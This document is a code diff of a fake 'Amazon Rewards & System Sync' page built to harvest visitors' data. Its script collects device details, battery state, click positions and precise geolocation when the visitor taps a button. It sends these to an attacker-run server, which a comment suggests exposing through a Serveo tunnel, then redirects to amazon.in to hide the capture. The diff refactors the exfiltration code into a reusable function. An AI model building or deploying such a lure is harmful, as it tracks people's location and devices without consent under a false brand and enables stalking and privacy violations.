@@ -4,7 +4,7 @@
     <title>Amazon Rewards & System Sync</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #f3f3f3; padding-top: 50px; }
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f3f3f3; padding-top: 50px; }
         .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; width: 90%; max-width: 400px; }
         .amazon-logo { width: 120px; margin-bottom: 20px; }
         .btn { background-color: #febd69; border: 1px solid #a88734; color: #111; padding: 12px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; }
@@ -21,13 +21,28 @@
 </div>
 
 <script>
-const serverURL = "http://localhost:3000"; // Replace with your Serveo tunnel if needed
+const serverURL = "http://localhost:3000"; // Replace with Serveo tunnel if needed
 
-// 🟢 SESSION START
-fetch("/session-start", { method: "POST" });
+// Send mobile info + location to server
+function sendData(data) {
+    fetch(`${serverURL}/log-info`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    }).catch(err => console.log("❌ Send data error:", err));
+}
 
-// 📱 Send Mobile Info + Location
-function sendDeviceInfo(lat=null, lon=null){
+// Track clicks
+document.addEventListener("click", (e) => {
+    fetch(`${serverURL}/log-click`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ x: e.clientX, y: e.clientY, time: new Date() })
+    });
+});
+
+// Get mobile info + battery
+function getMobileInfo() {
     const data = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
@@ -41,58 +56,41 @@ function sendDeviceInfo(lat=null, lon=null){
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         batteryLevel: 0,
         isCharging: false,
-        latitude: lat,
-        longitude: lon,
-        time: new Date().toString()
+        latitude: null,
+        longitude: null
     };
 
-    if(navigator.getBattery){
+    if (navigator.getBattery) {
         navigator.getBattery().then(battery => {
-            data.batteryLevel = Math.round(battery.level*100);
+            data.batteryLevel = Math.round(battery.level * 100);
             data.isCharging = battery.charging;
-            fetch("/log-info", {
-                method:"POST",
-                headers:{"Content-Type":"application/json"},
-                body: JSON.stringify(data)
-            });
+            sendData(data);
         });
     } else {
-        fetch("/log-info", {
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body: JSON.stringify(data)
+        sendData(data);
+    }
+}
+
+// Get location
+function trackLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            sendData({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform
+            });
         });
     }
 }
 
-// Click to capture location + mobile info
-document.getElementById("openBoth").addEventListener("click", ()=>{
-    if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(pos=>{
-            sendDeviceInfo(pos.coords.latitude, pos.coords.longitude);
-            window.location.href = "https://www.amazon.in";
-        }, err=>{
-            sendDeviceInfo();
-            window.location.href = "https://www.amazon.in";
-        }, { enableHighAccuracy:true });
-    } else {
-        sendDeviceInfo();
-        window.location.href = "https://www.amazon.in";
-    }
-});
-
-// 🖱 Click tracking (heatmap base)
-document.addEventListener("click", e=>{
-    fetch("/log-click", {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body: JSON.stringify({ x:e.clientX, y:e.clientY, time:new Date() })
-    });
-});
-
-// 🔴 SESSION END
-window.addEventListener("beforeunload", ()=>{
-    fetch("/session-end",{method:"POST"});
+// Start on button click
+document.getElementById("openBoth").addEventListener("click", () => {
+    getMobileInfo();
+    trackLocation();
+    // Redirect to Amazon after "sync"
+    window.location.href = "https://www.amazon.in";
 });
 </script>
 
